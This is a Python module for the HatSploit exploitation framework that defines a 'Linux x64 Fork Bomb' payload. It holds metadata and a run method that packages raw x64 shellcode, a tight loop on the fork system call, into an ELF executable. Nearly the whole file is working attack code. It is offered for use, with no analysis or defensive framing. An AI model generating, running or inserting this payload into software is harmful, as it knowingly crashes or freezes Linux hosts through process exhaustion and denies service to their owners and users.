#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Fork Bomb",
        'Payload': "linux/x64/fork_bomb",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Fork bomb payload for Linux x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "linux",
        'Risk': "low",
        'Type': "one_side"
    }

    def run(self):
        shellcode = (
            b"\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5"
        )

        payload = self.generate('elf', 'x64', shellcode)
        return payload
